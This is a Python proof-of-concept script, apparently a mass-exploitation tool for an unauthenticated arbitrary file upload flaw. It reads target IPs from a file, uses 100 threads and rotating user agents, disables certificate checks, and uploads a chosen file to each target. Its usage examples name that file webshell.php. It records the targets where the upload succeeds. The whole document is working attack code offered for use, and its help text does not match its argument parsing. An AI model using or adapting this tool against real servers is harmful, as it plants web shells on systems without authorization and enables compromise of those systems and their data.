import sys
import requests
from termcolor import cprint
import colorama

colorama.init(autoreset=True)
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from queue import Queue
from threading import Thread
import threading
from random import choice
from time import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"]
headers = {}
url = []
queueLock = threading.Lock()


def check_vul(target_url, file_name):
    try:
        if target_url.endswith('/'):
            target_url = target_url[:-1]
        check_upload(target_url, file_name)
    except Exception as e:
        print('[-]请求超时或错误，请排查：' + str(e))


def check_upload(target_url, file_name):
    try:
        target_url = check_url_http(target_url)
        files = {'file': open(file_name, 'rb')}
        headers["User-Agent"] = choice(USER_AGENTS)
        if "https" in target_url:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # 取消SSL验证的警告
            res = requests.post(target_url, files=files, verify=False, timeout=5)
        else:
            res = requests.post(target_url, files=files, timeout=5)
        text = res.text
        res = res.status_code
        if res == 200:
            cprint('[+]' + text, 'red')
            with open('未授权任意文件上传.txt', 'a', encoding='utf-8') as f:
                f.writelines(target_url)
                f.write('\n')
        else:
            print("[-]利用失败！")
    except:
        print('[-]请求超时或错误，请排查：' + target_url)
        with open('error.txt', 'a', encoding='utf-8') as f:
            f.writelines(target_url)
            f.write('\n')


def start_jobs(data, num, file_name):
    """
    启动所有工作线程
    argument: data -> 数据队列 num -> 线程数
    """
    is_alive = [True]

    def job():
        """工作线程"""
        while is_alive[0]:
            try:
                ip = data.get()
                if ip is None:
                    break  # 遇到结束标记
                queueLock.acquire()  # 获取锁,未获取到会阻塞程序，直到获取到锁
                check_vul(ip, file_name)  # 验证漏洞
                queueLock.release()  # 释放锁，归回后，其他人也可以调用
            except:
                is_alive[0] = False
        data.put(None)  # 结束标记

    jobs = [Thread(target=job) for i in range(num)]  # 创建多个线程
    for j in jobs:
        j.setDaemon(True)  # 设置线程为守护线程
        j.start()  # 启动线程

    for j in jobs:
        j.join()  # 等待线程退出，等到队列为空，再执行别的操作


def check_url_http(url):
    isHTTPS = True
    if "http" not in url:
        try:
            target_url = "https://" + url
            """
            requests模块请求一个证书无效的网站的话会直接报错,可以设置verify参数为False解决这个问题,但是设置verify=False会抛出一个InsecureRequestWarning的警告
            """
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # 取消SSL验证的警告
            requests.get(url=target_url, verify=False, timeout=6)
        except Exception as e:
            isHTTPS = False
        finally:
            if isHTTPS:
                target_url = 'https://' + url
                return target_url
            else:
                target_url = 'http://' + url
                return target_url
    else:
        return url


def ip_read():
    file_name = str(sys.argv[2])  # 输入文本名
    for line in open(file_name):
        ip = line.strip()  # 消除字符串整体的指定字符,括号里什么都不写,默认消除空格和换行符
        if ip:
            url.append(ip)


def main():
    cprint('''
                 .__                .__                       .__                    .___
  ____   ____    |  |   ____   ____ |__| ____     __ ________ |  |   _________     __| _/
 /    \ /  _ \   |  |  /  _ \ / ___\|  |/    \   |  |  \____ \|  |  /  _ \__  \   / __ | 
|   |  (  <_> )  |  |_(  <_> ) /_/  >  |   |  \  |  |  /  |_> >  |_(  <_> ) __ \_/ /_/ | 
|___|  /\____/   |____/\____/\___  /|__|___|  /  |____/|   __/|____/\____(____  /\____ | 
     \/                     /_____/         \/         |__|                   \/      \/ 

        ''', "yellow")
    if len(sys.argv) != 5:  # 判断输入长度是否合格
        cprint('''Explain:
        -h      show this help message and exit
        -u      Target URL
        -f      webshell file
        ''', "blue")
        cprint('''Example:
        python3 testpoc.py -h 10.10.10.10 -f webshell.php
        python3 testpoc.py -r ip.txt -f webshell.php''', "magenta")
        return
    a = str(sys.argv[1])  # 输入类型
    b = str(sys.argv[3])  # 输入类型
    if a == '-u':
        target_url = str(sys.argv[2])  # 获取ip地址
        url.append(target_url)
    if a == '-r':
        ip_read()
    if b == '-f':
        file_name = str(sys.argv[4])  # 获取ip地址
    """开启多线程"""
    data = Queue()
    for ip in url:
        data.put(ip)  # 写入队列
    data.put(None)  # 结束标记
    num = 100  # 默认100线程
    begin = time()
    start_jobs(data, num, file_name)  # 启动工作线程
    end = time()
    print('花费时间： %ss' % str(end - begin))


if __name__ == '__main__':
    main()